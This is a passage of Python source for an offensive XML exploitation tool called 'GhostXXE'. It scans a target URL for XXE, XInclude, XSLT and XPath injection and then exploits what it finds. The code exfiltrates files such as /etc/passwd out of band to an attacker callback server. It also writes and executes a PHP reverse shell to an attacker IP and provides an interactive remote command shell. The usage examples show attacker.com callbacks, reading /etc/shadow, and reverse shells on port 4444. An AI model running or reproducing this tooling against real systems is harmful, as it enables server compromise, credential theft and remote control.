        if response and self._check_xxe_response(response, '/etc/passwd'):
            print(f"{Colors.SUCCESS}[+] XInclude XXE Detected!{Colors.RESET}")
            self.vulnerabilities_found.append({
                'type': 'XInclude XXE',
                'payload': payload
            })
            return True
        
        print(f"{Colors.WARNING}[-] XInclude XXE not detected{Colors.RESET}")
        return False
    
    def test_xslt_injection(self) -> bool:
        """Test for XSLT injection vulnerabilities"""
        print(f"\n{Colors.HEADER}[*] Testing XSLT Injection{Colors.RESET}")
        
        # Test PHP XSLT RCE
        print(f"{Colors.INFO}[*] Testing PHP XSLT RCE{Colors.RESET}")
        php_payloads = PayloadGenerator.xslt_rce_php()
        
        for idx, payload in enumerate(php_payloads, 1):
            response = self.send_payload(payload, f"XSLT PHP RCE #{idx}")
            
            if response and ('root:' in response.text or 'uid=' in response.text):
                print(f"{Colors.SUCCESS}[+] XSLT PHP RCE Detected!{Colors.RESET}")
                print(f"\n{Colors.INFO}[*] Command Output:{Colors.RESET}")
                print(response.text[:500])
                
                self.vulnerabilities_found.append({
                    'type': 'XSLT PHP RCE',
                    'payload': payload
                })
                return True
        
        # Test .NET XSLT RCE
        print(f"{Colors.INFO}[*] Testing .NET XSLT RCE{Colors.RESET}")
        dotnet_payload = PayloadGenerator.xslt_rce_dotnet()
        response = self.send_payload(dotnet_payload, "XSLT .NET RCE")
        
        if response and ('\\' in response.text or 'BEGIN OUTPUT' in response.text):
            print(f"{Colors.SUCCESS}[+] XSLT .NET RCE Detected!{Colors.RESET}")
            self.vulnerabilities_found.append({
                'type': 'XSLT .NET RCE',
                'payload': dotnet_payload
            })
            return True
        
        # Test XSLT file read
        print(f"{Colors.INFO}[*] Testing XSLT File Read{Colors.RESET}")
        file_read_payload = PayloadGenerator.xslt_file_read()
        response = self.send_payload(file_read_payload, "XSLT File Read")
        
        if response and self._check_xxe_response(response, '/etc/passwd'):
            print(f"{Colors.SUCCESS}[+] XSLT File Read Detected!{Colors.RESET}")
            self.vulnerabilities_found.append({
                'type': 'XSLT File Read',
                'payload': file_read_payload
            })
            return True
        
        print(f"{Colors.WARNING}[-] XSLT injection not detected{Colors.RESET}")
        return False
    
    def test_xpath_injection(self) -> bool:
        """Test for XPATH injection"""
        print(f"\n{Colors.HEADER}[*] Testing XPATH Injection{Colors.RESET}")
        
        payloads = PayloadGenerator.xpath_injection_payloads()
        baseline_response = self.send_payload('<root>test</root>', "Baseline")
        
        if not baseline_response:
            return False
        
        baseline_length = len(baseline_response.text)
        
        for payload in payloads:
            xml_with_injection = f'''<?xml version="1.0" encoding="UTF-8"?>
<root>
<query>{payload}</query>
</root>'''
            
            response = self.send_payload(xml_with_injection, f"XPATH: {payload}")
            
            if response:
                # Check for significant response differences
                length_diff = abs(len(response.text) - baseline_length)
                if length_diff > 100 or response.status_code != baseline_response.status_code:
                    print(f"{Colors.SUCCESS}[+] Potential XPATH Injection Detected!{Colors.RESET}")
                    print(f"{Colors.INFO}[*] Payload: {payload}{Colors.RESET}")
                    print(f"{Colors.INFO}[*] Length difference: {length_diff}{Colors.RESET}")
                    
                    self.vulnerabilities_found.append({
                        'type': 'XPATH Injection',
                        'payload': payload
                    })
                    return True
        
        print(f"{Colors.WARNING}[-] XPATH injection not detected{Colors.RESET}")
        return False
    
    def exploit_oob_http(self) -> bool:
        """Exploit XXE with OOB HTTP callback"""
        if not self.callback_url:
            print(f"{Colors.WARNING}[-] Callback URL required for OOB exploitation{Colors.RESET}")
            return False
        
        print(f"\n{Colors.HEADER}[*] Exploiting XXE with OOB HTTP{Colors.RESET}")
        print(f"{Colors.INFO}[*] Callback URL: {self.callback_url}{Colors.RESET}")
        print(f"{Colors.INFO}[*] Target file: {self.file_path}{Colors.RESET}")
        
        # Start OOB server
        self._start_oob_server()
        
        # Generate and send payload
        xml_payload, dtd_payload = PayloadGenerator.xxe_oob_http(
            self.callback_url,
            self.file_path
        )
        
        OOBServer.dtd_payload = dtd_payload
        
        print(f"\n{Colors.INFO}[*] Sending OOB payload...{Colors.RESET}")
        response = self.send_payload(xml_payload, "OOB HTTP XXE")
        
        if response:
            print(f"{Colors.SUCCESS}[+] Payload sent! Waiting for callback...{Colors.RESET}")
            print(f"{Colors.INFO}[*] Check OOB server output above for exfiltrated data{Colors.RESET}")
            time.sleep(5)
            
            if OOBServer.captured_data:
                print(f"\n{Colors.SUCCESS}[+] Data successfully exfiltrated via OOB!{Colors.RESET}")
                return True
        
        return False
    
    def _start_oob_server(self):
        """Start OOB HTTP server in background thread"""
        print(f"{Colors.INFO}[*] Starting OOB server on port {self.callback_port}...{Colors.RESET}")
        
        def run_server():
            server = HTTPServer(('0.0.0.0', self.callback_port), OOBServer)
            server.timeout = 1
            for _ in range(10):  # Run for 10 seconds
                server.handle_request()
        
        server_thread = threading.Thread(target=run_server, daemon=True)
        server_thread.start()
        time.sleep(1)
        print(f"{Colors.SUCCESS}[+] OOB server started{Colors.RESET}")
    
    def deploy_reverse_shell(self, attacker_ip: str, attacker_port: int):
        """Deploy reverse shell via XXE"""
        print(f"\n{Colors.HEADER}[*] Deploying Reverse Shell{Colors.RESET}")
        print(f"{Colors.INFO}[*] Attacker: {attacker_ip}:{attacker_port}{Colors.RESET}")
        
        # Generate PHP reverse shell
        write_payload, execute_payload = PayloadGenerator.xxe_reverse_shell_php(
            attacker_ip,
            attacker_port
        )
        
        # Start listener
        print(f"\n{Colors.INFO}[*] Start your listener: nc -lvnp {attacker_port}{Colors.RESET}")
        input(f"{Colors.WARNING}[!] Press Enter when listener is ready...{Colors.RESET}")
        
        # Write shell
        print(f"{Colors.INFO}[*] Writing shell to target...{Colors.RESET}")
        self.send_payload(write_payload, "Deploy Shell - Write")
        
        time.sleep(2)
        
        # Execute shell
        print(f"{Colors.INFO}[*] Executing shell...{Colors.RESET}")
        self.send_payload(execute_payload, "Deploy Shell - Execute")
        
        print(f"{Colors.SUCCESS}[+] Shell deployment attempted!{Colors.RESET}")
        print(f"{Colors.INFO}[*] Check your listener for connection{Colors.RESET}")
    
    def interactive_exploit(self):
        """Interactive command execution mode"""
        print(f"\n{Colors.HEADER}[*] Interactive Exploitation Mode{Colors.RESET}")
        print(f"{Colors.INFO}[*] Using expect wrapper for command execution{Colors.RESET}")
        print(f"{Colors.WARNING}[!] Type 'exit' to quit{Colors.RESET}\n")
        
        while True:
            try:
                command = input(f"{Colors.SUCCESS}xxe-shell> {Colors.RESET}")
                
                if command.lower() in ['exit', 'quit']:
                    break
                
                if not command.strip():
                    continue
                
                # Generate payload with expect wrapper
                payload = PayloadGenerator.xxe_expect_rce(command)
                response = self.send_payload(payload, f"Command: {command}")
                
                if response:
                    print(f"\n{Colors.INFO}[*] Output:{Colors.RESET}")
                    # Try to extract command output from response
                    output = self._extract_output(response.text)
                    print(output if output else response.text[:500])
                    print()
                
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}[!] Exiting...{Colors.RESET}")
                break
            except Exception as e:
                print(f"{Colors.ERROR}[-] Error: {str(e)}{Colors.RESET}")
    
    def _extract_output(self, text: str) -> str:
        """Extract command output from XML response"""
        # Try to find content between common XML tags
        patterns = [
            r'<root>(.*?)</root>',
            r'<output>(.*?)</output>',
            r'<result>(.*?)</result>',
            r'<data>(.*?)</data>'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, text, re.DOTALL)
            if match:
                return match.group(1).strip()
        
        return text
    

    # ═══════════════════════════════════════════════════════════════
    # NOTE: Advanced test methods integrated from advanced_payloads.py
    # All 50+ payloads are now accessible via PayloadGenerator class
    # Advanced tests run when --advanced flag is used
    # ═══════════════════════════════════════════════════════════════
    
    def run_scan(self, include_advanced=False):
        """Run complete XXE scan"""
        print(f"\n{Colors.HEADER}[*] Starting GhostXXE Comprehensive Scan{Colors.RESET}")
        print(f"{Colors.INFO}[*] Target: {self.target_url}{Colors.RESET}")
        print(f"{Colors.INFO}[*] Method: {self.method}{Colors.RESET}")
        
        # Run basic detection tests
        basic_tests = [
            self.detect_xxe_basic,
            self.detect_xxe_error_based,
            self.detect_xxe_local_dtd,
            self.detect_xinclude,
            self.test_xslt_injection,
            self.test_xpath_injection
        ]
        
        # Run advanced tests if requested
        advanced_tests = [
            self.test_advanced_protocols,
            self.test_waf_bypass,
            self.test_advanced_xslt,
            self.test_advanced_xpath,
            self.test_feed_formats,
            self.test_office_documents
        ] if include_advanced else []
        
        all_tests = basic_tests + advanced_tests
        
        print(f"{Colors.INFO}[*] Running {len(basic_tests)} basic tests{Colors.RESET}")
        if include_advanced:
            print(f"{Colors.INFO}[*] Running {len(advanced_tests)} additional advanced tests{Colors.RESET}")
        
        for test in all_tests:
            try:
                test()
                time.sleep(1)  # Avoid overwhelming target
            except Exception as e:
                print(f"{Colors.ERROR}[-] Test failed: {str(e)}{Colors.RESET}")
                if self.verbose:
                    import traceback
                    traceback.print_exc()
        
        # Print summary
        self._print_summary()
    
    def _print_summary(self):
        """Print scan summary"""
        print(f"\n{Colors.HEADER}{'='*70}{Colors.RESET}")
        print(f"{Colors.HEADER}[*] Scan Complete - Summary{Colors.RESET}")
        print(f"{Colors.HEADER}{'='*70}{Colors.RESET}\n")
        
        if self.vulnerabilities_found:
            print(f"{Colors.SUCCESS}[+] Found {len(self.vulnerabilities_found)} vulnerabilities:{Colors.RESET}\n")
            
            for idx, vuln in enumerate(self.vulnerabilities_found, 1):
                print(f"{Colors.INFO}[{idx}] {vuln['type']}{Colors.RESET}")
                if 'file' in vuln:
                    print(f"    File: {vuln['file']}")
                print(f"    Payload Preview: {vuln['payload'][:100]}...")
                print()
        else:
            print(f"{Colors.WARNING}[-] No vulnerabilities detected{Colors.RESET}")
            print(f"{Colors.INFO}[*] This doesn't mean the target is secure - try manual testing{Colors.RESET}")
        
        print(f"{Colors.HEADER}{'='*70}{Colors.RESET}\n")


def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description='GhostXXE - Advanced XML Exploitation Framework | Ghost Ops Security',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Basic XXE scan
  python3 ghostxxxe.py -u http://target.com/api -m POST
  
  # OOB exploitation with callback
  python3 ghostxxxe.py -u http://target.com/api -m POST --oob --callback http://attacker.com:8080
  
  # Test specific file read
  python3 ghostxxxe.py -u http://target.com/api -m POST -f /etc/shadow
  
  # Interactive shell mode
  python3 ghostxxxe.py -u http://target.com/api -m POST --interactive
  
  # Deploy reverse shell
  python3 ghostxxxe.py -u http://target.com/api -m POST --reverse-shell --attacker-ip 10.0.0.1 --attacker-port 4444
  
  # Full scan with custom headers and proxy
  python3 ghostxxxe.py -u http://target.com/api -m POST -H "Authorization: Bearer token" --proxy http://127.0.0.1:8080 -v

👻 Ghost Ops Security - Where Hackers Fear to Tread 👻
        '''
    )
    
    # Required arguments
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    
    # Optional arguments
    parser.add_argument('-m', '--method', default='POST', choices=['GET', 'POST'], 
                       help='HTTP method (default: POST)')
    parser.add_argument('-p', '--param', help='URL parameter name for GET requests')
    parser.add_argument('-f', '--file', default='/etc/passwd', 
                       help='File to read (default: /etc/passwd)')
    parser.add_argument('-H', '--headers', help='Custom headers (comma-separated, e.g. "Key:Value,Key2:Value2")')
    parser.add_argument('-c', '--cookies', help='Cookies (semicolon-separated)')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Request timeout (default: 10)')
    parser.add_argument('--proxy', help='Proxy URL (e.g. http://127.0.0.1:8080)')
    
    # OOB options
    parser.add_argument('--oob', action='store_true', help='Enable Out-of-Band exploitation')
    parser.add_argument('--callback', help='Callback URL for OOB (e.g. http://attacker.com)')
    parser.add_argument('--callback-ip', help='Callback IP for OOB server')
    parser.add_argument('--callback-port', type=int, help='Callback port for OOB server (default: 8080)')
    
    # Exploitation modes
    parser.add_argument('--interactive', action='store_true', help='Interactive command execution mode')
    parser.add_argument('--reverse-shell', action='store_true', help='Deploy reverse shell')
    parser.add_argument('--attacker-ip', help='Attacker IP for reverse shell')
    parser.add_argument('--attacker-port', type=int, help='Attacker port for reverse shell')
    
    # Scan options
    parser.add_argument('--advanced', action='store_true', 
                       help='Run advanced tests (protocols, WAF bypass, DoS, feeds, office docs)')
    parser.add_argument('--skip-dos', action='store_true',
                       help='Skip DoS tests (recommended for production)')
    
    # Output options
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-o', '--output', help='Save results to JSON file')
    
    args = parser.parse_args()
    
    # Display banner
    Banner.show()
    
    # Initialize scanner
    scanner = XXEScanner(args)
    
    try:
        # Check mode
        if args.reverse_shell:
            if not args.attacker_ip or not args.attacker_port:
                print(f"{Colors.ERROR}[-] --attacker-ip and --attacker-port required for reverse shell{Colors.RESET}")
                return
            scanner.deploy_reverse_shell(args.attacker_ip, args.attacker_port)
            
        elif args.interactive:
            scanner.interactive_exploit()
            
        elif args.oob:
            scanner.exploit_oob_http()
            
        else:
            # Run full scan
            scanner.run_scan(include_advanced=args.advanced)
        
        # Save results if requested
        if args.output and scanner.vulnerabilities_found:
            with open(args.output, 'w') as f:
                json.dump(scanner.vulnerabilities_found, f, indent=2)
            print(f"{Colors.SUCCESS}[+] Results saved to: {args.output}{Colors.RESET}")
    
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Scan interrupted by user{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.ERROR}[-] Error: {str(e)}{Colors.RESET}")
        if args.verbose:
            import traceback
            traceback.print_exc()


if __name__ == '__main__':
    main()
